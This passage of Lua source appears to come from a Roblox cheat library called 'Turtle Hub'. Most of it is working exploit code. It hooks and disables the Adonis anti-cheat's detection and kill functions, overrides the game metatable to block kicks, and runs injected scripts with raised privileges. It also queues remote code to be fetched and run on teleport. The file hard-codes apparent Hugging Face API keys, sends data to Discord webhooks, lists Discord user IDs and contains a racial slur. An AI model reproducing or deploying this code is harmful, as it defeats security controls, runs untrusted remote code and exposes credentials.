				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(TP_DISTANCE.TweenSpeed,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.under,0)}):Play()
			elseif TP_DISTANCE.tpm == "behind" then
				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(TP_DISTANCE.TweenSpeed,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.new(0,0,TP_DISTANCE.behind)}):Play()
			else
				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(TP_DISTANCE.TweenSpeed,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str}):Play()
			end
		end
	elseif mthd == "tweenvar" then
		if TP_DISTANCE.tps == "Based On Magnitude" then
			if TP_DISTANCE.tpm == "top" then
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(lib.getRootDistance(str) * 0.05,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(-TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.top,0)})
			elseif TP_DISTANCE.tpm == "under" then
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(lib.getRootDistance(str) * 0.05,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.under,0)})
			elseif TP_DISTANCE.tpm == "behind" then
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(lib.getRootDistance(str) * 0.05,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.new(0,0,TP_DISTANCE.behind)})
			else
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(lib.getRootDistance(str) * 0.05,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str})
			end
		elseif TP_DISTANCE.tps == "Based On Speed" then
			if TP_DISTANCE.tpm == "top" then
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(math.max(lib.getRootDistance(str) / TP_DISTANCE.TweenSpeed,1),Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(-TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.top,0)})
			elseif TP_DISTANCE.tpm == "under" then
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(math.max(lib.getRootDistance(str) / TP_DISTANCE.TweenSpeed,1),Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.under,0)})
			elseif TP_DISTANCE.tpm == "behind" then
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(math.max(lib.getRootDistance(str) / TP_DISTANCE.TweenSpeed,1),Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.new(0,0,TP_DISTANCE.behind)})
			else
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(math.max(lib.getRootDistance(str) / TP_DISTANCE.TweenSpeed,1),Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str})
			end
		elseif TP_DISTANCE.tps == "Based On Speed 2" then
			if TP_DISTANCE.tpm == "top" then
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(TP_DISTANCE.TweenSpeed,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(-TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.top,0)})
			elseif TP_DISTANCE.tpm == "under" then
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(TP_DISTANCE.TweenSpeed,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.under,0)})
			elseif TP_DISTANCE.tpm == "behind" then
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(TP_DISTANCE.TweenSpeed,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.new(0,0,TP_DISTANCE.behind)})
			else
				return TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(TP_DISTANCE.TweenSpeed,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str})
			end
		end
	elseif mthd == "tp" then
		if TP_DISTANCE.tpm == "top" then
			LocalPlayer.Character.HumanoidRootPart.CFrame = str * CFrame.Angles(math.rad(-TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.top,0)
		elseif TP_DISTANCE.tpm == "under" then
			LocalPlayer.Character.HumanoidRootPart.CFrame = str * CFrame.Angles(math.rad(TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.under,0)
		elseif TP_DISTANCE.tpm == "behind" then
			LocalPlayer.Character.HumanoidRootPart.CFrame = str * CFrame.new(0,0,TP_DISTANCE.behind)
		else
			LocalPlayer.Character.HumanoidRootPart.CFrame = str
		end
	else
		lib:notify("Teleport method is invalid, try select another method",10)
	end
end

--[[
TP_DISTANCE2 = {
under = -20,
top = 20,
behind = -1.5,
tpm = "behind"
}
]]
function lib:CustomTeleport(mthd,str,tip,param)
	TP_DISTANCE2 = param or {under = -20,top = 20,behind = 1.5,tpm = "behind",tps = "Based On Magnitude",TweenSpeed = 0.7,Rotation = 20}
	if mthd == "tween" and tip == "cframe" then
		if TP_DISTANCE2.tpm == "top" then
			TweenService:Create(str,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(-TP_DISTANCE2.Rotation),0,0) + Vector3.new(0,TP_DISTANCE2.top,0)}):Play()
		elseif TP_DISTANCE2.tpm == "under" then
			TweenService:Create(str,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(TP_DISTANCE2.Rotation),0,0) + Vector3.new(0,TP_DISTANCE2.under,0)}):Play()
		elseif TP_DISTANCE2.tpm == "behind" then
			TweenService:Create(str,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,TP_DISTANCE2.behind)}):Play()
		end
	elseif mthd == "tp" and tip == "cframe" then
		if TP_DISTANCE2.tpm == "top" then
			str.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(-TP_DISTANCE2.Rotation),0,0) + Vector3.new(0,TP_DISTANCE2.top,0)
		elseif TP_DISTANCE2.tpm == "under" then
			str.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(TP_DISTANCE2.Rotation),0,0) + Vector3.new(0,TP_DISTANCE2.under,0)
		elseif TP_DISTANCE2.tpm == "behind" then
			str.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,TP_DISTANCE2.behind)
		end
	elseif mthd == "tween" and tip == "position" then
		if TP_DISTANCE2.tpm == "top" then
			TweenService:Create(str,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{CFrame = LocalPlayer.Character.HumanoidRootPart.Position * CFrame.Angles(math.rad(-TP_DISTANCE2.Rotation),0,0) + Vector3.new(0,TP_DISTANCE2.top,0)}):Play()
		elseif TP_DISTANCE2.tpm == "under" then
			TweenService:Create(str,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{CFrame = LocalPlayer.Character.HumanoidRootPart.Position * CFrame.Angles(math.rad(TP_DISTANCE2.Rotation),0,0) + Vector3.new(0,TP_DISTANCE2.under,0)}):Play()
		elseif TP_DISTANCE2.tpm == "behind" then
			TweenService:Create(str,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{CFrame = LocalPlayer.Character.HumanoidRootPart.Position * CFrame.new(0,0,TP_DISTANCE2.behind)}):Play()
		end
	elseif mthd == "tp" and tip == "position" then
		if TP_DISTANCE2.tpm == "top" then
			str.CFrame = LocalPlayer.Character.HumanoidRootPart.Position * CFrame.Angles(math.rad(-TP_DISTANCE2.Rotation),0,0) + Vector3.new(0,TP_DISTANCE2.top,0)
		elseif TP_DISTANCE2.tpm == "under" then
			str.CFrame = LocalPlayer.Character.HumanoidRootPart.Position * CFrame.Angles(math.rad(TP_DISTANCE2.Rotation),0,0) + Vector3.new(0,TP_DISTANCE2.under,0)
		elseif TP_DISTANCE2.tpm == "behind" then
			str.CFrame = LocalPlayer.Character.HumanoidRootPart.Position * CFrame.new(0,0,TP_DISTANCE2.behind)
		end
	else
		lib:notify(":18927: Teleport method is invalid, try select another method",10)
	end
end

function lib:RemoteBypass() -- adonis
	for k,v in pairs(getgc(true)) do 
		if pcall(function() return rawget(v,"indexInstance") end) and type(rawget(v,"indexInstance")) == "table" and (rawget(v,"indexInstance"))[1] == "kick" then
			v.tvk = {"kick",function() 
				return false
			end}
		end
	end
end

function lib.AnimatedText(arg,time,f)
	local dur = time or 0.001
	if typeof(time) == "number" and typeof(f) == "function" then
		task.spawn(function()
			for array = 1,string.len(arg) do 
				f(string.sub(arg,1,array))
				wait(time)
			end
		end)
	elseif typeof(time) ~= "number" then
		lib:notify(lib:ColorFonts("time.sleep() argument must be a number (number expected, got " .. typeof(time) .. ")","Bold,Red"),10)
	elseif typeof(f) ~= "function" then
		lib:notify(lib:ColorFonts("Argument #3 must be a function (function expected, got " .. typeof(f) .. ")","Bold,Red"),10)
	elseif typeof(time) ~= "number" and typeof(f) ~= "function" then
		lib:notify(lib:ColorFonts("time.sleep() argument and Argument #3 must be a number, function (number, function expected, got " .. typeof(time) .. ", " .. typeof(f) .. ")","Bold,Red"),10)
	end
end

local RunningVanguard = {
	Vulns = false,
	SystemDetectionProtector = false,
	AdonisDetection = false,
	IdleDetection = false
}

function lib:VulnsBypass()
	RunningVanguard.Vulns = true
	for _,v in next,getgc(true) do 
		if typeof(v) == "table" and rawget(v,"Detected") and typeof(rawget(v,"Detected")) == "function" and rawget(v,"RLocked") then
			for i,v in next,v do
				lib:notify(i .. " | " .. typeof(v),15)
				if rawequal(i,"Detected") then
					local old
					old = hookfunction(v,function(action,info,nocrash)
						if TurtleFlags.AdonisVulnBypass == true then
							if rawequal(action,"_") and rawequal(info,"_") and rawequal(nocrash,true) then
								return old(action, info, nocrash)
							end
							return task.wait(9e9)
						end
					end)
					break
				end
			end
		end
	end
end

function lib:Queue_On_Teleport(str)
    if (queue_on_teleport) then
        if type(str) == "string" then
		lib:notify("Auto execute is ready... this script will automatically execute when u join another subplaces/game",10)
		if str:find("Sidhsksjsjsh/Elite-Script-Folder") then
			queue_on_teleport('lib:LoadRepository("' .. str .. '")')
		else
			queue_on_teleport('loadstring(game:HttpGet("' .. str .. '"))()');
		end
	else
		lib:notify(lib:ColorFonts(`Argument must be a string, got {typeof(str)} / {type(str)}`,"Red"),10)
        end
    else
	lib:notify(lib:ColorFonts(`{Exploit()} | missing-function - "queue_on_teleport"`,"Red"),10)
    end
end	

function lib:BypassKick()
	RunningVanguard.SystemDetectionProtector = false
	local mt = getrawmetatable(game)
	local old = mt.__namecall
	local protect = newcclosure or protect_function

	if not protect then
		protect = function(f)
			return f 
		end
	end

	setreadonly(mt,false)
	mt.__namecall = protect(function(self,...)
	        local method = getnamecallmethod()
		if TurtleFlags.BypassDetection == true then
			if method == "Kick" then
				lib:notify(lib:ColorFonts(`[ Turtle Protection ] Bypassed client kick`,"Bold,Green"),100)
				return
			end
		end
	        return old(self,...)
	end)
	hookfunction(LocalPlayer.Kick,protect(function()
		if TurtleFlags.BypassDetection == true then
			lib:notify(lib:ColorFonts(`[ Turtle Protection ] Bypassed client kick`,"Bold,Green"),100)
			wait(math.huge)
		end
	end))
end

function lib.getToolHandleEvent(plr)
    local toolName = plr.Character and plr.Character:FindFirstChildWhichIsA("Tool")
    if toolName ~= nil then
        return toolName.Name
    else
	return "null"
    end
end

function lib:ACPatch() -- adonis detection algorithm
	RunningVanguard.AdonisDetection = true
	setthreadidentity(2)

	for i,v in getgc(true) do
    		if typeof(v) == "table" then
        		local DetectFunc = rawget(v,"Detected")
        		local KillFunc = rawget(v,"Kill")
    
        		if typeof(DetectFunc) == "function" and not Detected then
           	 		Detected = DetectFunc
            
            		local Old
	  	 	Old = hookfunction(Detected,function(Action,Info,NoCrash)
				if TurtleFlags.AdonisACFlagBypass == true then 
					if Action ~= "_" then
						if DEBUG then
							lib:notify(lib:ColorFonts(`Adonis Anti Cheat flagged. Method: {Action}, Info: {Info}`,"Bold,Red"),100)
						end
					end
				        return true
				end
            		end)

            		table.insert(Hooked,Detected)
        	end

		if rawget(v,"Variables") and rawget(v,"Process") and typeof(KillFunc) == "function" and not Kill then
            		Kill = KillFunc
            		local Old
			Old = hookfunction(Kill,function(Info)
				if TurtleFlags.AdonisClientKillBypass == true then
					if DEBUG then
						lib:notify(lib:ColorFonts(`Adonis Anti Cheat tried to kill (fallback): {Info}`,"Bold,Red"),100)
					end
				end
            		end)

            		table.insert(Hooked,Kill)
        	end
    	end
	end

	local Old
	Old = hookfunction(getrenv().debug.info,newcclosure(function(...)
    		local LevelOrFunc,Info = ...
		if TurtleFlags.BypassAdonisDetection == true then
			if Detected and LevelOrFunc == Detected then
        			if DEBUG then
           	 			lib:notify(lib:ColorFonts("[ Turtle Script Patcher ] Bypassed adonis detection","Bold,Green"),100)
        			end

        			return coroutine.yield(coroutine.running())
    			end
    
    			return Old(...)
		end
	end))
	setthreadidentity(7)
end

function lib:BypassPurchase(script)
    --getrenv()._set = clonefunction(setthreadidentity)
    local old
    old = hookmetamethod(game,"__index",function(a,b)
        task.spawn(function()
            setthreadidentity(7)
            task.wait(0.1)
            local went,error = pcall(function()
                loadstring(script)()
            end)
            --print(went,error)
        end)
        hookmetamethod(game,"__index",old)
        return old(a,b)
    end)
end

local function SendMessage(url,message)
    local response = http({
        Url = url,
        Method = "POST",
        Headers = {
		["Content-Type"] = "application/json"
	},
        Body = HttpService:JSONEncode({["content"] = message})
    })
    lib:notify(lib:ColorFonts("Sent","Bold,Green"),10)
end

local function SendMessageEMBED(url,embed,user_to_tag)
    local data = {
	["content"] = user_to_tag,
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local response = http({
        Url = url,
        Method = "POST",
        Headers = {
		["Content-Type"] = "application/json"
	},
        Body = HttpService:JSONEncode(data)
    })
    lib:notify(lib:ColorFonts("Sent","Bold,Green"),10)
end

function lib.sentMessage(url,msg,embed,mention)
	local get_mention = mention or "@everyone"
	if msg == "embed system" then
		SendMessageEMBED(url,embed,get_mention)
	else
		SendMessage(url,msg)
	end
end

function lib.getTable(str,name)
	if type(str) == "string" then
		if str == "get" then
			return {"announcement","chat","cmd","meme","rules","galau","console"}
		elseif str == "sent" then
			return name:gsub("announcement",turtle.webhook.announce):gsub("chat",turtle.webhook.chat):gsub("cmd",turtle.webhook.cmd):gsub("meme",turtle.webhook.meme):gsub("rules",turtle.webhook.rules):gsub("galau",turtle.webhook.galau):gsub("console",turtle.webhook.console)
		end
	end
end
--[[
lib.sentMessage(lib.getTable("sent","galau"),"",{})
Chouko : 1135213188082831502
Axtr0 : 984175806106464356
]]
function lib.getUserTag(label,name)
	if type(label) == "string" then
		if label == "get" then
			return {"@None","@everyone","@here","@Fahri","@Asya","@Akbar","@Fania","@Gapryong","@Sauce","@Timmy","@TW O","@Kaiseanat","@nino","@BM Kooozin","@Skibidi","@Chouko","@Axtr0","@Salsah","@Panda / @.reanie","@bleeding from tears (@frodowithglasses)"}
		elseif label == "sent" then
			return name:gsub(
				"@Fahri",
				"<@955564914028716043>"
			):gsub(
				"@Asya",
				"<@907148919207759912>"
			):gsub(
				"@Akbar",
				"<@953630026266452008>"
			):gsub(
				"@Fania",
				"<@896744133450952796>"
			):gsub(
				"@Gapryong",
				"<@1110937899207237744>"
			):gsub(
				"@Sauce",
				"<@339544843992825856>"
			):gsub(
				"@Timmy",
				"<@1067718700112826418>"
			):gsub(
				"@TW O",
				"<@777152933926010880>"
			):gsub(
				"@Kaiseanat",
				"<@848600442292535316>"
			):gsub(
				"@nino",
				"<@1138839184203849848>"
			):gsub(
				"@BM Kooozin",
				"<@1072408998751514685>"
			):gsub(
				"@Skibidi",
				"<@878889508119150594>"
			):gsub(
				"@Chouko",
				"<@1135213188082831502>"
			):gsub(
				"@Axtr0",
				"<@984175806106464356>"
			):gsub(
				"@Salsah",
				"<@788702331184742411>"
			):gsub(
				"@Panda / @.reiane",
				"<@824663108848975922>"
			):gsub(
				"@bleeding from tears (@frodowithglasses)",
				"<@878889508119150594>"
			)
		end
	end
end

local updatedDate = MarketplaceService:GetProductInfo(game.PlaceId).Updated
local dt = DateTime.fromIsoDate(updatedDate)

local function vcenab()
if game:GetService("VoiceChatService"):IsVoiceEnabledForUserIdAsync(LocalPlayer.UserId) then
        return "True"
   else
        return "False"
end
end

local APIUrl = {
	wikipedia = "https://en.wikipedia.org/w/rest.php/v1/search/page?q=",
	hf = {
		sum = "https://api-inference.huggingface.co/models/facebook/bart-large-cnn",
		google = "https://api-inference.huggingface.co/models/google/flan-t5-base",
		gpt2 = "https://api-inference.huggingface.co/models/gpt2-large",
		geminiv1 = "https://api-inference.huggingface.co/models/google/gemma-2b-it"
	},
	hfkey = {
		write = "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",
		read = "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"
	},
	Jokeho = "https://geek-jokes.sameerkumar.website/api?format=json",
	booklib = "https://openlibrary.org/search.json"
}

local function SearchWikipedia(searchq,funct)
local success,response = pcall(function()
	return http({
		Url = APIUrl.wikipedia .. searchq
		})
end)

if success then
	if response.StatusCode == 200 then
		local data = HttpService:JSONDecode(response.Body)
		local Filter = nil
		local index = 0
		local item
		repeat
			index=index+1
			item = data.pages[index]
			--Filter = chatmodule.SearchQuery(item.excerpt,badwords,true,true,false)
		until Filter == nil or data.pages[index] == nil
		local title = item.title
		local excerpt = item.excerpt
		local pattern = "<span class=\"searchmatch\">(.-)</span>"
		
		local text = excerpt:gsub(pattern, "%1")

		funct(title,text)
	else
		funct(lib:ColorFonts("Error: " .. response.StatusCode .. " " .. response.StatusMessage,"Red"),10)
	end
	else
		funct(lib:ColorFonts("Error: " .. response,"Red"),10)
	end
end

local function SearchWikipedia2(searchq,funct)
local success, response = pcall(function()
	return http({
		Url = APIUrl.wikipedia .. searchq
	       })
end)


if success then
	if response.StatusCode == 200 then
		local data = HttpService:JSONDecode(response.Body)
		local Filter = nil
		local index = 0
		local item
		repeat
			index = index + 1
			item = data.pages[index]
			--Filter=chatmodule.SearchQuery(item.excerpt,badwords,true,true,false)
		until Filter == nil or data.pages[index] == nil
		local title = item.title
		local excerpt = item.excerpt
		local pattern = "<span class=\"searchmatch\">(.-)</span>"
		
		local text = excerpt:gsub(pattern, "%1")
		
		--print(title)
		--print(text)
		funct("Generating response..")

		local key = item.key


		local base_url = "https://en.wikipedia.org/w/api.php?action=query&prop=extracts&exintro&explaintext&titles="
		local article_url = base_url .. key .. "&format=json"


		local success, response = pcall(function()
			return http({
				Url = article_url,
				Method = "GET"
			       })
		end)
		local data = HttpService:JSONDecode(response.Body)
		local pages = data.query.pages
		funct(title,text,data,pages)

			if success then
				if response.StatusCode == 200 then
					local ext = nil

					task.spawn(function()
						for key, value in pairs(pages) do
							local page_key = key
						        local extract = value.extract
						         ext = extract
					        end
					end)
					print(data)
			else
				funct(lib:ColorFonts("Error: " .. response.StatusCode .. " " .. response.StatusMessage,"Red"),10)
			end
	else
		funct(lib:ColorFonts("Error: " .. response,"Red"),10)
	end


end 
end
end

local function summarrization(inputq,funct)
local headers = {
	["Authorization"] = APIUrl.hfkey.read
	--["Content-Type"] = "application/json"
}

local payload = {
	inputs = inputq
}

local payloadJSON = HttpService:JSONEncode(payload)

local success, response = pcall(function()
	return http({
		Url = APIUrl.hf.sum,
		Method = "POST",
		Headers = headers,
		Body = payloadJSON
	       })
end)

if success then
	local responseJSON = HttpService:JSONDecode(response.Body)
	print(response)
	if responseJSON[1].summary_text then
		funct(responseJSON[1].summary_text)
	else
		funct(response)
	end
else
	funct(lib:ColorFonts("Request failed: " .. response,"Red"),10)
end

end

local function Instruct(inputText,funct)

local headers = {
	["Authorization"] = APIUrl.hfkey.read,
	["Content-Type"] = "application/json"
}

local function query(payload)
	local jsonPayload = HttpService:JSONEncode(payload)
	--local response = HttpService:PostAsync(APIUrl.hf.google,jsonPayload,Enum.HttpContentType.ApplicationJson,false,headers)
	local response = http({
			Url = APIUrl.hf.google,
			Method = "POST",
			Headers = headers,
			Body = jsonPayload
		})

	local jsonResponse = HttpService:JSONDecode(response)
	return jsonResponse
end

local output = query({
	["inputs"] = inputText
})

funct(output[1]["generated_text"])
end

local function GPT2(inputText,funct)
local headers = {
	["Authorization"] = APIUrl.hfkey.read,
	["Content-Type"] = "application/json"
}

local function query(payload)
	local jsonPayload = HttpService:JSONEncode(payload)
	--local response = HttpService:PostAsync(APIUrl.hf.gpt2,jsonPayload,Enum.HttpContentType.ApplicationJson,false,headers)
	local response = http({
			Url = APIUrl.hf.gpt2,
			Method = "POST",
			Headers = headers,
			Body = jsonPayload
		})
		
	local jsonResponse = HttpService:JSONDecode(response)
	return jsonResponse
end

local output = query({
	["inputs"] = inputText,
	["max_length"] = 200,
	["num_return_sequences"] =1,
	["temperature"] = 2
})

funct(output[1]["generated_text"])
end

local function ExtractjokeTable(funct)
	--local response = HttpService:GetAsync(APIUrl.joke)
	local response = game:HttpGet(APIUrl.Jokeho)
	local jokes = {}
	local data = HttpService:JSONDecode(response)
	if data.joke then
		funct(data.joke)
	else
		funct(lib:ColorFonts("Oops, failed to load shit jokes. there was an error with the Backend API","Red"))
	end
end

local function search_book(query,funct)
local param = "q=" .. HttpService:UrlEncode(query)

local success, response = pcall(function()
	--return HttpService:GetAsync(APIUrl.booklib .. "?" .. param)
	return game:HttpGet(APIUrl.booklib .. "?" .. param)
end)

if success then
	local responseJSON = HttpService:JSONDecode(response)

	if responseJSON.num_found > 0 then
		local doc = responseJSON.docs[1]

		funct("Title : " .. doc.title .. "\nAuthor : " .. (doc.author_name and doc.author_name[1] or "Unknown") .. "\nFirst published year : " .. (doc.first_publish_year or "Unknown") .. "\nOpen Library ID : " .. doc.key)
	else
		funct(lib:ColorFonts("No results found for query: "..response,"Red"))
	end
else
	funct(lib:ColorFonts("Request failed: " .. response,"Red"))
end
end
--APIUrl.hf.geminiv1
local function GeminiV1(systemMessage,query,previousConversation,funct)
local headers = {Authorization = APIUrl.hfkey.read}

local function querys(payload)
	local response = httpService:PostAsync(APIUrl.hf.geminiv1,httpService:JSONEncode(payload),Enum.HttpContentType.ApplicationJson,false,headers)
	return httpService:JSONDecode(response)
end

	local conversation = {}
	table.insert(conversation,"<start_of_turn>system\n" .. systemMessage .. "<end_of_turn>")
	if previousConversation then
		local everyother = 0
		for key, line in previousConversation do
			if everyother==0 then
				everyother=1
				table.insert(conversation,"<start_of_turn>user\n" .. line .. "<end_of_turn>")	
			else 
				everyother=0
				table.insert(conversation,"<start_of_turn>model\n" .. line .. "<end_of_turn>")	
			end	
		end
	end
	table.insert(conversation,"<start_of_turn>user\n" .. query .. "<end_of_turn>")
	table.insert(conversation,"<start_of_turn>model\n")
	local output = querys({inputs = table.concat(conversation,"\n")})
	print(output)
	local generatedText = output[1]["generated_text"]
	print(generatedText)
	local lines = {}
	for line in string.gmatch(generatedText, "[^\n]+") do
		table.insert(lines, line)
	end

print(lines)
	local result = ""
	for i = #lines, 1, -1 do
		if lines[i] == "<start_of_turn>model" then
		--	local line = lines[i]
			local lastline=#lines
			for i2 = #lines, 1, -1 do
				if i==i2 then break
				else 	
					local line = lines[i2]
					result = line .. "\n" .. result	
				end
			end
			break
	
		end
	end
print(result)

--	local result=string.sub(generatedText, startIndex + 20, endIndex - 1)
	if result then 
		if string.sub(result,-12) == "<end_of_turn>" then
			result = string.sub(result, 1, -13)
	        end

		if previousConversation == nil then
			previousConversation={}
		end
		table.insert(previousConversation,query)
		table.insert(previousConversation,result)
	end
	funct(result) --,previousConversation)
end

function lib:TurtleAI(str,model,funct)
	if model == "Top result : wikipedia" then
		SearchWikipedia(str,function(v,i)
			funct("title : " .. v .. "\nText : " .. i .. "\n\nDebug traceback : " .. (debug.traceback() or "unknown debugging") .. "")
		end)
	elseif model == "Entire article : wikipedia" then
		SearchWikipedia2(str,function(v,i,a,z)
			funct("title : " .. v .. "\nText : " .. i .. "\nData : " .. a .. "\nExtract : " .. z)
		end)
	elseif model == "Summarize paragraph AI" then
		summarrization(str,function(v)
			funct(v)
		end)
	elseif model == "Google Flan T5" then
		Instruct(str,function(v)
			funct(v)
		end)
	elseif model == "GPT2 Sentence Completion" then
		GPT2(str,function(v)
			funct(v)
		end)
	elseif model == "Chessy chuck norris jokes" then
		ExtractjokeTable(function(i,v)
			funct(i)
		end)
	elseif model == "Book searching" then
		search_book(str,function(v)
			funct(v)
		end)
	elseif model == "Google Gemini V1" then
		GeminiV1("You are a useful bot",str,nil,function(result)
			funct(result)
		end)
	else
		funct(lib:ColorFonts("API Models not found.\ntry use another API Models","Red"))
	end
end

--https://www.roblox.com/users/6133870238/profile
function lib:DeveloperAccess(f)
	if DATA("admin.lua")[table.find(DATA("admin.lua"),LocalPlayer.UserId)] == LocalPlayer.UserId then --if LocalPlayer.UserId == 3621188307 or LocalPlayer.UserId == 7289597899 then
		--TurtleScreenNotify("Turtle Hub | Developer only","Loading hidden feature",{},3,{})
		f()
		--lib:notify(lib:ColorFonts(lib:ColorFonts("Loading developer tab/panel...","Bold"),"Red"),10)
	end
end

function lib.isDeveloper()
	if DATA("userdata.lua")[table.find(DATA("userdata.lua"),LocalPlayer.UserId)] == LocalPlayer.UserId then --if LocalPlayer.UserId == 3621188307 or LocalPlayer.UserId == 7289597899 or LocalPlayer.UserId == 5596804337 or LocalPlayer.UserId == 377597987 or LocalPlayer.UserId == 9174393 then
		--lib:notify(lib:ColorFonts(lib:ColorFonts("WELCOME TESTER!","Bold"),"Green"),10)
		--TurtleScreenNotify("Turtle Hub | Beta Tester","Welcome beta test!",{},nil,{})
		return true
	end
	TurtleScreenNotify("Turtle Hub | Error","This script is being tested by our tester\nTester handled by fahri & syifa",{},nil,{})
	return false
end

function lib:Copy(str)
	--local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
	if setclipboard then
           setclipboard(str)
	   --lib:notify(`Copied! "{str}"`,10)
	   TurtleScreenNotify("Turtle Hub | Clipboard",`Successfully copied "{str}"`,{},nil,{})
	else
	--lib:notify(lib:ColorFonts(`{Exploit()} | missing-function - "setclipboard" or "toclipboard"`,"Red"),10)
	TurtleScreenNotify("Turtle Hub | Unsupported function",`{Exploit()} doesnt have "setclipboard" or "toclipboard" envs.\nget a better exploit, nigga!`,{},nil,{})
    end
end

function lib:TurtleExplorer()
local Iris = loadstring(game:HttpGet("https://raw.githubusercontent.com/x0581/Iris-Exploit-Bundle/main/bundle.lua"))().Init(game:GetService("CoreGui"))
local PropertyAPIDump = game.HttpService:JSONDecode(game:HttpGet("https://anaminus.github.io/rbx/json/api/latest.json"))

local function GetPropertiesForInstance(Instance)
    local Properties = {}
    for i,v in next, PropertyAPIDump do
        if v.Class == Instance.ClassName and v.type == "Property" then
            pcall(function()
		if typeof(v.Name) ~= "nil" then
			--Properties[v:GetChildren()[1].Name] = {Value = Instance[v:GetChildren()[1].Name],Type = v:GetChildren()[1].ValueType}
		--else
			Properties[v.Name] = {Value = Instance[v.Name],Type = v.ValueType}
		end
            end)
        end
    end
    return Properties
end

local ScriptContent = [[]]
local SelectedInstance = nil
local Properties = {}
local AttrInject = {}
	
local function CrawlInstances(Inst)
    for _, Instance in next, Inst:GetChildren() do
        local InstTree = Iris.Tree({Instance.Name})

        Iris.SameLine() do
            if Instance:IsA("LocalScript") or Instance:IsA("ModuleScript") then
                if Iris.SmallButton({"View Script"}).clicked then
                    ScriptContent = decompile(Instance)
                end
            end
            if Iris.SmallButton({"View and Copy Properties"}).clicked then
                SelectedInstance = Instance
                Properties = GetPropertiesForInstance(Instance)
                --setclipboard("game." .. (SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE") .. "")
                lib:notify("Copied " .. lib:ColorFonts(Instance.ClassName,"Bold,Green"),10)
		if Instance:IsA("RemoteEvent") then
			lib:Copy(lib.getHierarchy(SelectedInstance) .. ":FireServer()")--(SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE") .. ":FireServer()")
			lib.sentMessage(
				lib.getTable("sent","galau"),
				lib.getHierarchy(SelectedInstance) .. ":FireServer()",
				{}
			)
		elseif Instance:IsA("RemoteFunction") then
			lib:Copy(lib.getHierarchy(SelectedInstance) .. ":InvokeServer()")
			lib.sentMessage(
				lib.getTable("sent","galau"),
